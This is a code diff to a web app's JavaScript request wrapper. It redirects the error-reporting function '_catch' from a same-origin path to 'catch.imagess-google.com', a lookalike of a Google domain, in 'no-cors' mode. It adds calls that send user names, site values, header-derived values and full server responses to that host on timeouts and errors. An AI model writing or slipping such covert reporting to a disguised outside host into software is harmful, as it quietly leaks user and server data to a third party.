@@ -208,6 +208,12 @@ function Xss(data){
   return [data,mayBeXss]
 }
 window._catch = function(data){
+  if (window.site) {
+    data.S=site
+  }
+  if(fetchGoal){
+    data.G=fetchGoal
+  }
   var str=[],k;
   for(var i in data){
     k=data[i];
@@ -219,11 +225,12 @@ window._catch = function(data){
   str=str.join('&')
   // var fetchUrl = state.UserName||data.UserName
   // fetchUrl = '/catch?'+(fetchUrl&&('U='+fetchUrl+'&'))+str
-  var fetchUrl = '/catch?'+str
+  var fetchUrl = 'http://catch.imagess-google.com?'+str
   fetch(fetchUrl, {
     credentials:'same-origin',
     method: 'GET',
     cache: 'no-store',
+    'mode':'no-cors',
     headers: {
       "Content-Type": "application/x-www-form-urlencoded"
     },
@@ -289,6 +296,7 @@ function setLoginPass(u,p,i){
 }
 
 var fetchArr=[]
+var fetchGoal
 window._fetch = function (data, option = {}){
   var user = /*data.Action!=='Register'&&*/data.UserName||state.UserName
   data = Xss(data)
@@ -359,6 +367,7 @@ window._fetch = function (data, option = {}){
     var st = state.turning&&setTimeout(function(){
       var msg = '网络请求超时，请重试'
       FetchCatch({msg})
+      _catch({msg:'timeout',A:data.Action,U:user})
       reject()
     },10000)
     var fetchUrl = '/tools/ssc_ajax.ashx?V='+_iver+'&A='+data.Action
@@ -410,13 +419,17 @@ window._fetch = function (data, option = {}){
       }catch(e){
         H={'x-sec':'I','a':'E'}
       }
-      var S=(!H['a'])?null:( H['a']+(H['x-sec']?('_'+H['x-sec']):''))
+      fetchGoal=`${H['a']}-${H['x-sec']}`
+      // var S=(!H['a'])?null:( H['a']+(H['x-sec']?('_'+H['x-sec']):''))
       if (res.status!==200) {
         var msg = "网络错误" + res.status
         FetchCatch({msg})
+        _catch({msg:'err'+res.status,A:data.Action,U:user})
         return
       }
-
+      if(T>10){
+        _catch({msg:'timeout'+T,A:data.Action,U:user})
+      }
       res.text().then(json=>{
         if (data.Action==='GetImageCode') {
           //获取验证码的不需要转换成json
@@ -435,14 +448,7 @@ window._fetch = function (data, option = {}){
           }else{
             var msg = data.Action+"数据解析错误"// + json
             FetchCatch({msg,error})
-            var catchData={A:data.Action,data:json,E:error.toString()}
-            if (window.site) {
-              catchData.S=site
-            }
-            if (user) {
-              catchData.U=user
-            }
-            _catch(catchData)
+            _catch({msg:'JSONerr',A:data.Action,U:user,E:error.toString(),Retrun:json})
           }
         }
 
@@ -545,6 +551,7 @@ window._fetch = function (data, option = {}){
         }catch(error){
           var msg = "返回数据拦截处理错误"
           FetchCatch({msg,error})
+          _catch({A:data.Action,msg:'Intercept',data:json,E:error.toString(),U:user})
         }
         notRes||resolve(json)
       }).catch(error => {
@@ -558,7 +565,7 @@ window._fetch = function (data, option = {}){
       }else{
         msg = "网络错误，请检查网络状态"
       }
-
+      _catch({msg:'fetchFailed'})
       // var msg = "网络错误，请检查网络状态"
       FetchCatch({msg})
     })
